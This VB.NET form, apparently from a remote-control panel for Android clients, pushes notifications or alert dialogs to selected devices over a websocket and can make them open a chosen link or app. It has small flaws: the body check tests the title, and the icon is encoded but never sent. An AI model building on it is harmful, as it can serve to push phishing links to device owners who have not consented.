Imports System.Drawing.Imaging
Imports System.IO
Imports System.Security.Cryptography

Public Class BTBroadcast

    Private iconpath As String = Nothing
    Public listclients As New List(Of BTClient)
    Public Selectedids As New List(Of String)

    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                titletxt.Text = "العنوان"
                Label1.Text = "الرسالة"
                Label2.Text = "الأمر"
                Label3.Text = "طريقة العرض"
                Label4.Text = "ايقونة"
                sndbtn.Text = "إرسال"


                Exit Select
            Case "CN" ' Chinese
                titletxt.Text = "标题"
                Label1.Text = "消息"
                Label2.Text = "命令"
                Label3.Text = "视图方式"
                Label4.Text = "图标"
                sndbtn.Text = "发送"
                Exit Select

            Case "RU" ' Russian
                titletxt.Text = "Заголовок"
                Label1.Text = "Сообщение"
                Label2.Text = "Команда"
                Label3.Text = "Режим просмотра"
                Label4.Text = "Иконка"
                sndbtn.Text = "Отправить"
                Exit Select

            Case "TR" ' Turkish
                titletxt.Text = "Başlık"
                Label1.Text = "Mesaj"
                Label2.Text = "Komut"
                Label3.Text = "Görünüm Şekli"
                Label4.Text = "Simge"
                sndbtn.Text = "Gönder"
                Exit Select
            Case "SP" ' Spanish
                titletxt.Text = "Título"
                Label1.Text = "Mensaje"
                Label2.Text = "Comando"
                Label3.Text = "Estilo de Apariencia"
                Label4.Text = "Ícono"
                sndbtn.Text = "Enviar"
                Exit Select

            Case "PR" ' Brazilian Portuguese
                titletxt.Text = "Título"
                Label1.Text = "Mensagem"
                Label2.Text = "Comando"
                Label3.Text = "Estilo de Aparência"
                Label4.Text = "Ícone"
                sndbtn.Text = "Enviar"
                Exit Select

            Case Else

        End Select
    End Sub
    Private Sub BTBroadcast_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.mytitle.Text = Broadcaststr
        For Each cli As BTClient In listclients
            Dim rowid As Integer = DGVC.Rows.Add(True, cli.wallpaper, cli.name)
            DGVC.Rows(rowid).Tag = cli.mobid
        Next
    End Sub

    Private Sub comboactions_SelectedIndexChanged(sender As Object, e As EventArgs) Handles comboactions.SelectedIndexChanged
        Select Case comboactions.Text
            Case "Nothing"
                actoninput.Visible = False
            Case "Open link"
                actoninput.Watermark = "Website link"
                actoninput.Visible = True
            Case "Open app"
                actoninput.Watermark = "App ID"
                actoninput.Visible = True
            Case Else
                comboactions.Text = "Nothing"
        End Select
    End Sub

    Private Sub combostyles_SelectedIndexChanged(sender As Object, e As EventArgs) Handles combostyles.SelectedIndexChanged
        Select Case combostyles.Text
            Case "Alert dialog"
                panelicon.Visible = True
            Case Else
                combostyles.Text = "Notification"
                panelicon.Visible = False
        End Select
    End Sub

    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon2.Click
        Dim openFD As New OpenFileDialog


        openFD.Title = "Select icon (.png)"
        openFD.Filter = "png Files|*.png"



        Select Case openFD.ShowDialog()

            Case DialogResult.OK
                If Not IsPngImage(openFD.FileName) Then
                    BTAlerter.erroes("only select .PNG file")
                    brodicon.Image = Nothing
                    iconpath = Nothing
                    Return
                End If
                iconpath = openFD.FileName
                brodicon.Image = ResizeImage(Image.FromFile(openFD.FileName), New Size(75, 75))
            Case Else
                brodicon.Image = Nothing
                iconpath = Nothing
        End Select
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles sndbtn.Click
        Dim thetitle As String = titlebrod.Text
        If isEmpty(thetitle) Then
            thetitle = "   "
        End If

        Dim msgbody As String = msgtext.Text
        If isEmpty(thetitle) Then
            msgbody = "   "
        End If


        Dim thetype As String = "0"
        Dim tolunch As String = "0"
        Select Case comboactions.Text
            Case "Open link"
                thetype = "2"
                tolunch = actoninput.Text
                If isEmpty(tolunch) Then
                    BTAlerter.infos(entersitestr)
                    Exit Sub
                End If
            Case "Open app"
                thetype = "1"
                tolunch = actoninput.Text
                If isEmpty(tolunch) Then
                    BTAlerter.infos(enterappidstr)
                    Exit Sub
                End If
        End Select

        Dim stylebord As String = "N"
        Dim theico As String = "0"
        If combostyles.Text <> "Notification" Then
            stylebord = "A"
            If iconpath Is Nothing OrElse Not File.Exists(iconpath) Then
                BTAlerter.infos(selcticostr)
                Exit Sub
            End If
            Dim iconbitmap As Bitmap = ResizeImage(Image.FromFile(iconpath), New Size(75, 75))
            Dim imageBytes As Byte() = Nothing

            Using ms As New MemoryStream()
                iconbitmap.Save(ms, ImageFormat.Png)
                imageBytes = ms.ToArray()
            End Using

            theico = Convert.ToBase64String(imageBytes)

        End If

        Dim noselected As Boolean = True
        For Each cli As DataGridViewRow In DGVC.Rows
            Try
                If cli.Cells(0).Value = True Then
                    noselected = False
                    Dim mobid As String = cli.Tag.ToString
                    Dim chatData As New Dictionary(Of String, Object) From {
                            {"msg", "bc"},
                            {"subc", stylebord},
                            {"toopen", tolunch},
                            {"theype", thetype},
                            {"thetitle", thetitle},
                            {"themsg", msgbody}
                    }
                    BTEngine.commands(chatData, mobid, BTEngine.MainForm.webSocketClient)
                End If

            Catch ex As Exception

            End Try
        Next
        If noselected Then
            BTAlerter.infos(selcclistr)
        End If

    End Sub
End Class